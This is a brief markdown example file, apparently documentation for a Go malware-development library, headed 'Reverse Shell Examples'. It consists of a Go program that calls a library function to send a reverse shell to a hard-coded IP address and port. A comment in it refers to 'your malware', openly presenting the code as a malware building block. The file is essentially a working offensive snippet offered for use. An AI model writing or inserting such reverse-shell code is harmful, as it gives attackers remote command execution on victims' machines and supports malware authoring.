# Reverse Shell Examples

- Send reverse shell to given ip and port

```go
package main

import (
  "github.com/D3Ext/maldev/revshell"
)

func main(){
  // Not recommended to implement in your malware
  revshell.Reverse("192.168.1.37", "9001")
}
```
